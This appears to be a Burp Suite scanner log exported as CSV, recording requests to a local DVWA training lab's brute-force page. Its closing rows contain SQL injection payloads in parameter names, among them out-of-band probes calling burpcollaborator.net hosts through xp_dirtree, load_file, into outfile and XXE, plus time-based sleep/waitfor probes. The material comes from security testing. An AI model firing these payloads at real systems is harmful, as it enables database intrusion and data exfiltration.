Number,Complete,Tool,Host,Method,Path,Query,Params,Status,ResponseLength,MimeType,UrlExtension,Comment,IsSSL,NewCookies,RequestTime,ResponseTime,ResponseDelay,ListenerInterface,Regex1Req,Regex1Resp,
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5038,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,441ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5018,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,451ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5020,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,460ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5028,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,471ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5042,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,478ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5026,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,488ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5008,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,497ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5030,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,507ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5030,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,516ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5030,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,530ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5040,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,540ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5034,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,557ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5164,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,566ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5136,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,577ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5024,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,587ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5026,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,594ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5092,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,605ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5130,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,614ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5154,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,653ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5166,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,667ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5324,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,674ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5200,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,683ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5054,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,690ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5060,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,705ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5066,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,719ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5238,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,743ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5046,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,761ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5042,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,783ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5046,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,792ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5048,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,803ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5104,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,823ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5014,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,832ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5124,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,841ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5126,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,850ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5094,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,863ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5000,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,873ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5114,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,882ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5116,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,891ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5006,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,905ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5002,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,915ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5006,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,927ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5006,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,938ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5028,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,949ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5034,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,957ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5040,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,969ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5046,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,979ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5010,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,986ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5016,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:12,2018/05/16 00:31:12,993ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5022,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,3ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5028,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,10ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5366,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,25ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5264,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,35ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5008,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,43ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5228,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,53ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5442,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,64ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5142,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,74ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,,false,200,5144,HTML,php,,false,PHPSESSID=0l4p0mqi1kbvmupqm6sspg4ac1; security=impossible; ,2018/05/16 00:31:13,2018/05/16 00:31:13,80ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,3x8xaho9ka=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,97ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fmnje%20SYSTEM%20%22http%3a%2f%2f5ntyfw60cl7sitkxtd9py1vhr8x5l892wskh.burpcollab'%7c%7c'orator.net%2f%22%3e%25fmnje%3b]%3e')%2c'%2fl')%20from%20dual)=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,107ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1'%7c%7c(select%20extractvalue(xmltype('%3c%3fxml%20version%3d%221.0%22%20encoding%3d%22UTF-8%22%3f%3e%3c!DOCTYPE%20root%20[%20%3c!ENTITY%20%25%20fmnje%20SYSTEM%20%22http%3a%2f%2fd9n614s8ytt04165flvxk9hpdgjd7hvbi16q.burpcollab'%7c%7c'orator.net%2f%22%3e%25fmnje%3b]%3e')%2c'%2fl')%20from%20dual)%7c%7c'=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,114ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c4puxhv8zek9rksmwvcbo00xgt7z4nvdj76xum.burpcollab'%2b'orator.net%5cttg'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,122ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1'%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c3jnwbu2y8j3qergvpb5nuzrfn6t3hu8i25sth.burpcollab'%2b'orator.net%5cbxm'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,129ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1)%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5c211vttkxqilpwqyu7anmcy9e55b2ztrhl4bs0.burpcollab'%2b'orator.net%5cksv'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,136ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1')%3bdeclare%20@q%20varchar(99)%3bset%20@q%3d'%5c%5cywyropftleglrmtq26ii7u4a016yupndh07ow.burpcollab'%2b'orator.net%5clnd'%3b%20exec%20master.dbo.xp_dirtree%20@q%3b--%20=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,146ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,(select%20load_file('%5c%5c%5c%5csd9l5jwn28xf8gakj0zcool4hvnsbjd77uxim.burpcollaborator.net%5c%5cqrm'))=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,153ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1'%2b(select%20load_file('%5c%5c%5c%5cn2qguelir3maxbzf8vo7djaz6qcn0e32xpndc.burpcollaborator.net%5c%5ckgx'))%2b'=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,160ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1%20into%20outfile%20'%5c%5c%5c%5ca0b3s1j5pqkxvyx26imub68m4daay12pwcm0b.burpcollaborator.net%5c%5cokh'%3b%20--%20=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,169ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1'=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,180ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,(select*from(select(sleep(20)))a)=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,188ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1%2b(select*from(select(sleep(20)))a)%2b=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,197ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1%20and%20(select*from(select(sleep(20)))a)--%20=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,206ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
0,true,Scanner,http://localhost,GET,/vulnerabilities/brute/index.php,1%20waitfor%20delay'0%3a0%3a20'--=1,true,200,4998,HTML,php,,false,,2018/05/16 00:31:13,2018/05/16 00:31:13,215ms,,Vulnerability: Brute Force :: Damn Vulnerable Web Application (DVWA) v1.9
